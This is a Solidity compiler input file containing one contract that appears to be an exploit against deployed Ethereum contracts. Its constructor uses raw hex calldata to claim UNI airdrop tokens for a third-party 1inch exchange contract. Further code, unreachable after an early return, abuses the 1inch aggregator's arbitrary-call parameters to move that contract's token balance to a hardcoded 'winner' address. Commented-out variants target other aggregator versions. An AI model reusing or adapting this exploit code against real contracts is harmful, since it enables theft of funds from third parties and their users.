{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":false,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"browser/1_Storage.sol":{"content":"pragma solidity ^0.6.0;\npragma experimental ABIEncoderV2;\n\ninterface Claim {\n    function claim(uint256 index, address account, uint256 amount, bytes32[] calldata merkleProof) external;\n}\n\ninterface Inch {\n    function swap(\n        address fromToken,\n        address toToken,\n        uint256 fromTokenAmount,\n        uint256 minReturnAmount,\n        uint256 guaranteedAmount,\n        address payable referrer,\n        address[] calldata callAddresses,\n        bytes calldata callDataConcat,\n        uint256[] calldata starts,\n        uint256[] calldata gasLimitsAndValues\n    )\n    external\n    payable\n    returns (uint256 returnAmount);\n}\n\ninterface Inch2 {\n    function aggregate(\n        address fromToken,\n        address toToken,\n        uint tokensAmount,\n        address[] calldata callAddresses,\n        bytes calldata callDataConcat,\n        uint[] calldata starts,\n        uint[] calldata values,\n        uint mintGasPrice,\n        uint minTokensAmount,\n        address payable referrer\n    )\n    external\n    payable\n    returns (uint returnAmount);\n}\n\ninterface Inch3 {\n    function aggregate(\n        address payable msgSender,\n        address fromToken,\n        address toToken,\n        uint tokensAmount,\n        address[] calldata callAddresses,\n        bytes calldata callDataConcat,\n        uint[] calldata starts,\n        uint[] calldata values,\n        uint mintGasPrice,\n        uint minTokensAmount,\n        address payable referrer\n    )\n    external\n    payable\n    returns (uint returnAmount);\n}\n\ninterface Inch4 {\n    function aggregate(\n        address fromToken,\n        address toToken,\n        uint tokensAmount,\n        address[] calldata callAddresses,\n        bytes calldata callDataConcat,\n        uint[] calldata starts,\n        uint[] calldata values,\n        uint mintGasPrice,\n        uint minTokensAmount,\n        uint guaranteedAmount,\n        address payable referrer\n    )\n    external\n    payable\n    returns (uint returnAmount);\n}\n\ninterface Inch5 {\n    function swap(\n        address fromToken,\n        address toToken,\n        uint256 fromTokenAmount,\n        uint256 minReturnAmount,\n        uint256 guaranteedAmount,\n        address payable referrer,\n        address[] calldata callAddresses,\n        bytes calldata callDataConcat,\n        uint256[] calldata starts,\n        uint256[] calldata values\n    )\n        external\n        payable\n        returns (uint256 returnAmount);\n}\n\ninterface Inch6 {\n    function aggregate(\n        address fromToken,\n        address toToken,\n        uint tokensAmount,\n        address[] calldata callAddresses,\n        bytes calldata callDataConcat,\n        uint[] calldata starts,\n        uint minTokensAmount,\n        uint mintGasPrice,\n        uint guaranteedAmount\n    )\n    external\n    payable\n    returns (uint returnAmount);\n}\n\ninterface Split1 {\n    function swap(\n        address fromToken,\n        address destToken,\n        uint256 amount,\n        uint256[] calldata distribution,\n        uint256 minReturn\n    ) external payable returns(uint256);\n}\n\ninterface Split2 {\n    function swap(\n        address fromToken,\n        address destToken,\n        uint256 amount,\n        uint256 minReturn,\n        uint256[] calldata distribution,\n        uint256 flags\n    ) external payable returns(uint256);\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n    \n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\ncontract Abc {\n    Inch6 constant inch = Inch6(0x00000000016697Fa9A9C8e2889E28D3D9816A078);\n    //Split2 constant split = Split2(0xB1ec61949e5DB1D681316C0E2f9132AFb62fC32f);\n    Claim constant claim = Claim(0x090D4613473dEE047c3f2706764f49E0821D256e);\n    IERC20 constant token = IERC20(0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984);\n    address constant uni = 0x2a1530C4C41db0B0b2bB646CB5Eb1A67b7158667;\n    address constant winner = 0x083fc10cE7e97CaFBaE0fE332a9c4384c5f54E45;\n    \n    receive() external payable {\n    }\n\n    constructor() public payable {\n        // uint256[18] memory proof18 = [\n        //     0xac65176a1d0fccac48ff6cd14757f7e0aa5099f98f6ba295ca5bcbd4c182df3b,\n        //     0x32762b54df48a4ca4a8bc303fb376788efe8211826b2bea3b87c9449c9984a27,\n        //     0x391921df814f248cdaacccb49182093781af18c5b5303c38f5c26b900e2a9b8d,\n        //     0xc7be34af25f5b7f698cfd73dea21f130ed6afc802ba514d33210a3d507444927,\n        //     0x60c0f41d328b02d57df7701528185be8f9392d00e9227d235c7c901aa6a080a9,\n        //     0xbb7d66ba784c4fbded586f5f825e674554fb5163cee6349135a6244e9dfb69b8,\n        //     0x091760592aaf2f8dcfc825e9136de966bdea1699e4de767262e340b6bca886bf,\n        //     0x327a9da3b80421b287ab468839e56bc732dadcc4910b14b622b55db81c65ba74,\n        //     0x87adb447fd2376de24f92d7ccc7a630f5492b32559df197c72ea924073b2d91c,\n        //     0x4b5ed063d9b55c101c57773d7e60963fb24631a3b73c5edf297d4667b5947b30,\n        //     0x423efd2210e8765037b701f98ae2de0bce6514bd9977be376024d5a4434787a2,\n        //     0x4ae1987c7092c9497fae6c54c6bf6d4fe8585a6ff6d34fc91ce7decfe35983e9,\n        //     0xaa266e41914debdc5bcac791d368279164b29aa6b4865b98e4feae1d1985e709,\n        //     0xe8c4b9850edade8e65f07765fd8fdc73a69f4c133315547f7b6bc0c37ee4b175,\n        //     0x5665fc633c28726ccf726054971b13edd877c99c8d2a64fb0d74c92bb7d39e1d,\n        //     0x6d79bbfc56dbc08f3c0ab6a11753883b322781b949cd36778c2f313f13212977,\n        //     0x26ecbdae89fc55ef1d8ef396bfd7ed36d54fc821c8f283fdbb5dcebec5f739df,\n        //     0xdeab88d76ca5389f96456da4fb9f1b2d7a54cb9ed14aab85dadcd9ab1d8e9cba\n        // ];\n\n        // bytes32[] memory proof = new bytes32[](proof18.length);\n        // for (uint i = 0; i < proof18.length; i++) {\n        //     proof[i] = bytes32(proof18[i]);\n        // }\n        \n        // claim.claim(\n        //     17137,\n        //     address(inch),\n        //     0x15af1d78b58c400000,\n        //     proof\n        // );\n        \n        (bool success, bytes memory data) = address(claim).call(hex\"2e7ba6ef00000000000000000000000000000000000000000000000000000000000138f900000000000000000000000050fda034c0ce7a8f7efdaebda7aa7ca21cc1267e000000000000000000000000000000000000000000000015af1d78b58c40000000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000012c4c1f46d75ce9d6df595de234be83fdfeb70a20987648679e2047c4c420e7c8dbe39b7e5fd445eafb2906f2f03141a3993840a8b8cd6e9e595aae8467b938b0d2b24fc9016b89fa9413e46546cd323ecc2310b799a5d62bad67e2ea40fc93364d5a6ed6cadcf6cd688243f39aab2535b15823a3bb094a3c29ccefda7dcf0946c4a6fb226d618d7f5baa1926db6699561972b5922112fd24ab2fcdad5c0691cf234b5b4e8370f56e2288085dd625ed2bb26f6333f8c133054d71d277fb6cfc9733c93a3dfc6e300cf950eed3d11e5c5894d6016d90339bc27ba0633097d53a6166bac4a6d6d185d95431155d36d5edd83b2436fae10629c460b2bfe82dc5da277041f006a0d179d5e30f06d1b8d1a770da77f99d92c740bd6412d350207d5d2cb0ed37937819636fa78a9914e6085a8ec293c3ae4fbd4137f5d6c3fa0f2a160a8e24bcea6ae1fb7b28cdba91ba5e7000dd0cec795fb40bdd54444375d7828e1bc9e87848f7a37c88e42ab2cda3d80139f1e69ae371d51ef3caf1532291a04b50a1fb50d1261c72913390838f887ba0123873a38d7d18105f477ddae5fe6a3545db23ca129765da47d9375bc28a3b3ee0803c3f09c201d4ce7646683db4548dea295845546c2c6061bd4681dc77578d4969b8641108ff32d5120aef4e069f0ed8b6d79bbfc56dbc08f3c0ab6a11753883b322781b949cd36778c2f313f1321297726ecbdae89fc55ef1d8ef396bfd7ed36d54fc821c8f283fdbb5dcebec5f739dfdeab88d76ca5389f96456da4fb9f1b2d7a54cb9ed14aab85dadcd9ab1d8e9cba\");\n        require(success, string(data));\nreturn;\n        address[] memory callAddresses = new address[](1);\n        callAddresses[0] = address(token);\n        \n        bytes memory callDataConcat = abi.encodeWithSelector(\n            token.balanceOf.selector,\n            address(0)\n        );\n        \n        uint256[] memory starts = new uint256[](2);\n        starts[0] = 0;\n        starts[1] = callDataConcat.length;\n        \n        uint256[] memory gasLimitsAndValues = new uint256[](1);\n        gasLimitsAndValues[0] = 0;\n        \n        // function aggregate(\n        //     address fromToken,\n            // address toToken,\n            // uint tokensAmount,\n            // address[] calldata callAddresses,\n            // bytes calldata callDataConcat,\n            // uint[] calldata starts,\n            // uint minTokensAmount,\n            // uint mintGasPrice,\n            // uint guaranteedAmount\n        // )\n        \n        inch.aggregate{value: msg.value}(\n            0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE,\n            address(token),\n            msg.value,\n            callAddresses,\n            callDataConcat,\n            starts,\n            1,\n            1,\n            token.balanceOf(address(inch))\n        );\n        \n        // function swap(\n        //     address fromToken,\n        //     address toToken,\n        //     uint256 fromTokenAmount,\n        //     uint256 minReturnAmount,\n        //     uint256 guaranteedAmount,\n        //     address payable referrer,\n        //     address[] calldata callAddresses,\n        //     bytes calldata callDataConcat,\n        //     uint256[] calldata starts,\n        //     uint256[] calldata values\n        // )\n\n        // inch.swap{value: msg.value}(\n        //     0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE,\n        //     address(token),\n        //     msg.value,\n        //     1,\n        //     token.balanceOf(address(inch)),\n        //     address(0),\n        //     callAddresses,\n        //     callDataConcat,\n        //     starts,\n        //     gasLimitsAndValues\n        // );\n        \n        // uint256[] memory dist = new uint256[](1);\n        // dist[0] = 1;\n        \n        // (bool success2, bytes memory data2) = address(split).call(hex\"3181803a0000000000000000000000001f9840a85d5aF5bf1D1762F925BDADdC4201F9840000000000000000000000001f9840a85d5aF5bf1D1762F925BDADdC4201F9840000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000001a000000000000000000000000000000000000000000000000000000000000002e00000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a931f4eb165ac307fd7431b5ec6eadde53e14b0c000000000000000000000000cbc6a023eb975a1e2630223a7959988948e664f3000000000000000000000000818e6fecd516ecc3849daf6845e3ec868087b7550000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000e000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000044f39b5b9b0000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000005ce7340000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000002386f26fc1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\");\n        // require(success2, string(data2));\n\n        // split.swap(\n        //     address(token),\n        //     address(token),\n        //     0,\n        //     0,\n        //     new uint256[](0),\n        //     0\n        // );\n        \n        \n        uint256 num = token.balanceOf(address(this));\n        require(num > 0);\n        token.transfer(winner, num);\n        \n        selfdestruct(msg.sender);\n    }\n}\n"}}}